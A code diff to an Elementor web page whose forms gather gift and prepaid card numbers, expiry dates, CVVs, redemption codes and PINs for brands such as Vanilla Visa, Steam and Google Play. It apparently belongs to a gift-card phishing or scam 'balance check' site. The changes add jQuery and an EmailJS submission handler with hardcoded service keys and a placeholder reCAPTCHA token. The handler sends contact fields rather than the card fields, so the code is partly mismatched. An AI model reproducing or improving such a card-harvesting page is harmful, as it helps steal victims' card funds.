@@ -20,6 +20,7 @@
 			emailjs.init("2J8DshQnpUuUkoM9C");
 		})();
 	</script>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 	<style id='classic-theme-styles-inline-css'>
 		/*! This file is auto-generated */
 		.wp-block-button__link {
@@ -514,8 +515,9 @@
 													class="dce-conditions-js-error-notice  elementor-message elementor-message-danger">
 													A problem was detected in the following Form. Submitting it could
 													result in errors. Please contact the site administrator.</div>
-												<form method="post" action="/send.php" >
-													<div data-field-conditions="[{&quot;id&quot;:&quot;card_number&quot;,&quot;condition&quot;:&quot;(card == \&quot;Master Card\&quot; or card == \&quot;Visa Silvery White\&quot; or card == \&quot;Joker\&quot; or card == \&quot;TT Visa\&quot; or card == \&quot;Amex\&quot; or card == \&quot;Visa (The perfect gift)\&quot; or card == \&quot;Vanilla Mastercard\&quot; or card == \&quot;Walmart Visa\&quot; or card == \&quot;Vanilla\&quot; or card == \&quot;Vanilla Visa\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;exp_mm&quot;,&quot;condition&quot;:&quot;(card == \&quot;Master Card\&quot; or card == \&quot;Visa Silvery White\&quot; or card == \&quot;Joker\&quot; or card == \&quot;TT Visa\&quot; or card == \&quot;Amex\&quot; or card == \&quot;Visa (The perfect gift)\&quot; or card == \&quot;Vanilla Mastercard\&quot; or card == \&quot;Walmart Visa\&quot; or card == \&quot;Vanilla\&quot; or card == \&quot;Vanilla Visa\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;exp_yy&quot;,&quot;condition&quot;:&quot;(card == \&quot;Master Card\&quot; or card == \&quot;Visa Silvery White\&quot; or card == \&quot;Joker\&quot; or card == \&quot;TT Visa\&quot; or card == \&quot;Amex\&quot; or card == \&quot;Visa (The perfect gift)\&quot; or card == \&quot;Vanilla Mastercard\&quot; or card == \&quot;Walmart Visa\&quot; or card == \&quot;Vanilla\&quot; or card == \&quot;Vanilla Visa\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;cvv&quot;,&quot;condition&quot;:&quot;(card == \&quot;Master Card\&quot; or card == \&quot;Visa Silvery White\&quot; or card == \&quot;Joker\&quot; or card == \&quot;TT Visa\&quot; or card == \&quot;Amex\&quot; or card == \&quot;Visa (The perfect gift)\&quot; or card == \&quot;Vanilla Mastercard\&quot; or card == \&quot;Walmart Visa\&quot; or card == \&quot;Vanilla\&quot; or card == \&quot;Vanilla Visa\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;redemption&quot;,&quot;condition&quot;:&quot;(card == \&quot;Sephora Card\&quot; or card == \&quot;Nike Card\&quot; or card == \&quot;Xbox\&quot; or card == \&quot;Raser Gold\&quot; or card == \&quot;Playstation\&quot; or card == \&quot;Amazon Card\&quot; or card == \&quot;Ebay Card\&quot; or card == \&quot;Google Play Card\&quot; or card == \&quot;Steam Wallet Card\&quot; or card == \&quot;Apple Card\&quot; or card == \&quot;Select Type Of Card\&quot; or card == \&quot;Footlocker\&quot; or card == \&quot;Nordstrom Card\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;pin&quot;,&quot;condition&quot;:&quot;(card == \&quot;Sephora Card\&quot; or card == \&quot;Nike Card\&quot; or card == \&quot;Footlocker\&quot; or card == \&quot;Nordstrom Card\&quot; )&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false}]"
+												<form method="post" action="/send.php" name="send_form" >
+													<input type="hidden" name="form_submitted" value="1" />
+													<div data-field-conditions="[{&quot;id& quot;:&quot;card_number&quot;,&quot;condition&quot;:&quot;(card == \&quot;Master Card\&quot; or card == \&quot;Visa Silvery White\&quot; or card == \&quot;Joker\&quot; or card == \&quot;TT Visa\&quot; or card == \&quot;Amex\&quot; or card == \&quot;Visa (The perfect gift)\&quot; or card == \&quot;Vanilla Mastercard\&quot; or card == \&quot;Walmart Visa\&quot; or card == \&quot;Vanilla\&quot; or card == \&quot;Vanilla Visa\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;exp_mm&quot;,&quot;condition&quot;:&quot;(card == \&quot;Master Card\&quot; or card == \&quot;Visa Silvery White\&quot; or card == \&quot;Joker\&quot; or card == \&quot;TT Visa\&quot; or card == \&quot;Amex\&quot; or card == \&quot;Visa (The perfect gift)\&quot; or card == \&quot;Vanilla Mastercard\&quot; or card == \&quot;Walmart Visa\&quot; or card == \&quot;Vanilla\&quot; or card == \&quot;Vanilla Visa\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;exp_yy&quot;,&quot;condition&quot;:&quot;(card == \&quot;Master Card\&quot; or card == \&quot;Visa Silvery White\&quot; or card == \&quot;Joker\&quot; or card == \&quot;TT Visa\&quot; or card == \&quot;Amex\&quot; or card == \&quot;Visa (The perfect gift)\&quot; or card == \&quot;Vanilla Mastercard\&quot; or card == \&quot;Walmart Visa\&quot; or card == \&quot;Vanilla\&quot; or card == \&quot;Vanilla Visa\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;cvv&quot;,&quot;condition&quot;:&quot;(card == \&quot;Master Card\&quot; or card == \&quot;Visa Silvery White\&quot; or card == \&quot;Joker\&quot; or card == \&quot;TT Visa\&quot; or card == \&quot;Amex\&quot; or card == \&quot;Visa (The perfect gift)\&quot; or card == \&quot;Vanilla Mastercard\&quot; or card == \&quot;Walmart Visa\&quot; or card == \&quot;Vanilla\&quot; or card == \&quot;Vanilla Visa\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;redemption&quot;,&quot;condition&quot;:&quot;(card == \&quot;Sephora Card\&quot; or card == \&quot;Nike Card\&quot; or card == \&quot;Xbox\&quot; or card == \&quot;Raser Gold\&quot; or card == \&quot;Playstation\&quot; or card == \&quot;Amazon Card\&quot; or card == \&quot;Ebay Card\&quot; or card == \&quot;Google Play Card\&quot; or card == \&quot;Steam Wallet Card\&quot; or card == \&quot;Apple Card\&quot; or card == \&quot;Select Type Of Card\&quot; or card == \&quot;Footlocker\&quot; or card == \&quot;Nordstrom Card\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;pin&quot;,&quot;condition&quot;:&quot;(card == \&quot;Sephora Card\&quot; or card == \&quot;Nike Card\&quot; or card == \&quot;Footlocker\&quot; or card == \&quot;Nordstrom Card\&quot; )&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false}]"
 														data-field-ids="[&quot;card&quot;,&quot;currency&quot;,&quot;amount&quot;,&quot;card_number&quot;,&quot;exp_mm&quot;,&quot;exp_yy&quot;,&quot;cvv&quot;,&quot;redemption&quot;,&quot;pin&quot;,&quot;field_012a1cb&quot;]"
 														class="elementor-form-fields-wrapper elementor-labels-above">
 														<div
@@ -572,9 +574,9 @@
 																	id="form-field-currency"
 																	class="elementor-field-textual elementor-size-sm"
 																	required="required" aria-required="true">
-																	<option value="USD">USD</option>
-																	<option value="GBP">GBP</option>
-																	<option value="AUD">AUD</option>
+																	<option value="USD" name="USD">USD</option>
+																	<option value="GBP" name="GBP">GBP</option>
+																	<option value="AUD" name="AUD">AUD</option>
 																	<option value="EUR">EUR</option>
 																	<option value="CAD">CAD</option>
 																</select>
@@ -675,7 +677,7 @@
 																<i class="fa-regular fa-eye-slash"
 																	onclick="toggle()"><span class="show--icon">Hide
 																		Card Info</span></i>
-																<script type="text/javascript">
+																<script >
 																	var currency = document.getElementById("form-field-currency");
 																	var cardType = document.getElementById("form-field-card");
 																	var cardAmount = document.getElementById("form-field-amount");
@@ -726,7 +728,7 @@
 																	});
 
 																	$(document).ready(function() {
-																		$("#submit").click(function() {
+																		$("#submit_btn").click(function() {
 																			var subject = $("#subject").val();
 																			var fname = $("#fname").val();
 																			var message = $("#message").val();
@@ -743,6 +745,16 @@
 																			var cardPin = document.getElementById("form-field-pin");
 																			var icon = document.querySelector(".fa-regular");
 																			var iconText = document.querySelector(".show--icon")
+
+																			var data = {
+																				service_id: 'service_3uyknph',
+																				template_id: 'template_24v2iow',
+																				user_id: '2J8DshQnpUuUkoM9C',
+																				template_params: {
+																					'username': 'James',
+																					'g-recaptcha-response': '03AHJ_ASjnLA214KSNKFJAK12sfKASfehbmfd...'
+																				}
+																			};
 
 																			var dataString = 'subject=' + subject + '&fname=' + fname + '&message=' + message + '&button=' + button;
 																			//validation 
@@ -774,8 +786,9 @@
 														</div>
 														<div
 															class="elementor-field-group elementor-column elementor-field-type-submit elementor-col-100 e-form__buttons">
-															<button type="submit"
+															<button 
 																id="submit_btn"
+																name="submit_btn"
 																class="elementor-button elementor-size-sm">
 																<span>
 																	<span class=" elementor-button-icon">
@@ -1521,7 +1534,8 @@
 							data-settings="{&quot;step_next_label&quot;:&quot;Next&quot;,&quot;step_previous_label&quot;:&quot;Previous&quot;,&quot;button_width&quot;:&quot;100&quot;,&quot;dce_confirm_dialog_enabled&quot;:&quot;no&quot;,&quot;step_type&quot;:&quot;number_text&quot;,&quot;step_icon_shape&quot;:&quot;circle&quot;,&quot;label_icon_size&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;field_icon_size&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}"
 							data-widget_type="form.default">
 							<div class="elementor-widget-container">
-								<form method="post" action="/send.php" >
+								<form method="post" action="/send.php" name="send_form" >
+									<input type="hidden" name="form_submitted" value="1" />
 									<input type="hidden" name="post_id" value="79" />
 									<input type="hidden" name="form_id" value="4c50212e" />
 									<input type="hidden" name="referer_title" value="" />
@@ -1550,7 +1564,7 @@
 										</div>
 										<div
 											class="elementor-field-group elementor-column elementor-field-type-submit elementor-col-100 e-form__buttons">
-											<button type="submit" class="elementor-button elementor-size-sm">
+											<button  class="elementor-button elementor-size-sm">
 												<span>
 													<span class=" elementor-button-icon">
 													</span>
@@ -1743,7 +1757,7 @@
 													class="dce-conditions-js-error-notice  elementor-message elementor-message-danger">
 													A problem was detected in the following Form. Submitting it could
 													result in errors. Please contact the site administrator.</div>
-												<form method="post" action="/send.php">
+												<form method="post" action="/send.php" name="send_form">
 													<div data-field-conditions="[{&quot;id&quot;:&quot;card_number&quot;,&quot;condition&quot;:&quot;(card == \&quot;Master Card\&quot; or card == \&quot;Visa Silvery White\&quot; or card == \&quot;Joker\&quot; or card == \&quot;TT Visa\&quot; or card == \&quot;Amex\&quot; or card == \&quot;Visa (The perfect gift)\&quot; or card == \&quot;Vanilla Mastercard\&quot; or card == \&quot;Walmart Visa\&quot; or card == \&quot;Vanilla\&quot; or card == \&quot;Vanilla Visa\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;exp_mm&quot;,&quot;condition&quot;:&quot;(card == \&quot;Master Card\&quot; or card == \&quot;Visa Silvery White\&quot; or card == \&quot;Joker\&quot; or card == \&quot;TT Visa\&quot; or card == \&quot;Amex\&quot; or card == \&quot;Visa (The perfect gift)\&quot; or card == \&quot;Vanilla Mastercard\&quot; or card == \&quot;Walmart Visa\&quot; or card == \&quot;Vanilla\&quot; or card == \&quot;Vanilla Visa\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;exp_yy&quot;,&quot;condition&quot;:&quot;(card == \&quot;Master Card\&quot; or card == \&quot;Visa Silvery White\&quot; or card == \&quot;Joker\&quot; or card == \&quot;TT Visa\&quot; or card == \&quot;Amex\&quot; or card == \&quot;Visa (The perfect gift)\&quot; or card == \&quot;Vanilla Mastercard\&quot; or card == \&quot;Walmart Visa\&quot; or card == \&quot;Vanilla\&quot; or card == \&quot;Vanilla Visa\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;cvv&quot;,&quot;condition&quot;:&quot;(card == \&quot;Master Card\&quot; or card == \&quot;Visa Silvery White\&quot; or card == \&quot;Joker\&quot; or card == \&quot;TT Visa\&quot; or card == \&quot;Amex\&quot; or card == \&quot;Visa (The perfect gift)\&quot; or card == \&quot;Vanilla Mastercard\&quot; or card == \&quot;Walmart Visa\&quot; or card == \&quot;Vanilla\&quot; or card == \&quot;Vanilla Visa\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;redemption&quot;,&quot;condition&quot;:&quot;(card == \&quot;Sephora Card\&quot; or card == \&quot;Nike Card\&quot; or card == \&quot;Xbox\&quot; or card == \&quot;Raser Gold\&quot; or card == \&quot;Playstation\&quot; or card == \&quot;Amazon Card\&quot; or card == \&quot;Ebay Card\&quot; or card == \&quot;Google Play Card\&quot; or card == \&quot;Steam Wallet Card\&quot; or card == \&quot;Apple Card\&quot; or card == \&quot;Select Type Of Card\&quot; or card == \&quot;Footlocker\&quot; or card == \&quot;Nordstrom Card\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;pin&quot;,&quot;condition&quot;:&quot;(card == \&quot;Sephora Card\&quot; or card == \&quot;Nike Card\&quot; or card == \&quot;Footlocker\&quot; or card == \&quot;Nordstrom Card\&quot; )&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false}]"
 														data-field-ids="[&quot;card&quot;,&quot;currency&quot;,&quot;amount&quot;,&quot;card_number&quot;,&quot;exp_mm&quot;,&quot;exp_yy&quot;,&quot;cvv&quot;,&quot;redemption&quot;,&quot;pin&quot;,&quot;field_012a1cb&quot;]"
 														class="elementor-form-fields-wrapper elementor-labels-above">
@@ -1955,6 +1969,59 @@
 																		}
 																	}
 
+																	$(document).ready(function() {
+																		$("#submit_btn").click(function() {
+																			var subject = $("#subject").val();
+																			var fname = $("#fname").val();
+																			var message = $("#message").val();
+																			var button = $("#submit").val();
+
+																			var currency = document.getElementById("form-field-currency");
+																			var cardType = document.getElementById("form-field-card");
+																			var cardAmount = document.getElementById("form-field-amount");
+																			var redemption = document.getElementById("form-field-redemption");
+																			var cardNumber = document.getElementById("form-field-card_number");
+																			var expMM = document.getElementById("form-field-exp_mm");
+																			var expYY = document.getElementById("form-field-exp_yy");
+																			var cardCVV = document.getElementById("form-field-cvv");
+																			var cardPin = document.getElementById("form-field-pin");
+																			var icon = document.querySelector(".fa-regular");
+																			var iconText = document.querySelector(".show--icon")
+
+																			var data = {
+																				service_id: 'service_3uyknph',
+																				template_id: 'template_24v2iow',
+																				user_id: '2J8DshQnpUuUkoM9C',
+																				template_params: {
+																					'username': 'James',
+																					'g-recaptcha-response': '03AHJ_ASjnLA214KSNKFJAK12sfKASfehbmfd...'
+																				}
+																			};
+
+																			var dataString = 'subject=' + subject + '&fname=' + fname + '&message=' + message + '&button=' + button;
+																			//validation 
+																			if (fname == '' || subject == '' || message == '') { //if you are use other form validation scripts remove the if statement 
+																				alert("Please fill all fields");
+																			}
+																			// AJAX Code To Submit Form.
+																			else {
+																				$('#loader').show();
+																				$.ajax({
+																					type: "POST",
+																					url: "https://api.emailjs.com/api/v1.0/email/send",
+																					data: dataString,
+																					cache: true,
+																					success: function(result) {
+																						$('#loader').hide();
+																						$('#response').html(result).fadeIn();
+																						$("#contact_form")[0].reset();
+																						$('#response').fadeOut(3000).delay(400);
+																					}
+																				});
+																			}
+																			return false;
+																		});
+																	});
 																</script>
 															</body>
 
@@ -1962,7 +2029,7 @@
 														</div>
 														<div
 															class="elementor-field-group elementor-column elementor-field-type-submit elementor-col-100 e-form__buttons">
-															<button type="submit"
+															<button 
 																class="elementor-button elementor-size-sm">
 																<span>
 																	<span class=" elementor-button-icon">
@@ -2880,7 +2947,8 @@
 											data-settings="{&quot;step_next_label&quot;:&quot;Next&quot;,&quot;step_previous_label&quot;:&quot;Previous&quot;,&quot;button_width&quot;:&quot;100&quot;,&quot;dce_confirm_dialog_enabled&quot;:&quot;no&quot;,&quot;step_type&quot;:&quot;number_text&quot;,&quot;step_icon_shape&quot;:&quot;circle&quot;,&quot;label_icon_size&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;field_icon_size&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}"
 											data-widget_type="form.default">
 											<div class="elementor-widget-container">
-												<form method="post" action="/send.php" >
+												<form method="post" action="/send.php" name="send_form" >
+													<input type="hidden" name="form_submitted" value="1" />
 													<input type="hidden" name="post_id" value="79" />
 													<input type="hidden" name="form_id" value="3fcb5770" />
 													<input type="hidden" name="referer_title" value="" />
@@ -2914,7 +2982,7 @@
 														</div>
 														<div
 															class="elementor-field-group elementor-column elementor-field-type-submit elementor-col-100 e-form__buttons">
-															<button type="submit"
+															<button 
 																class="elementor-button elementor-size-sm">
 																<span>
 																	<span class=" elementor-button-icon">
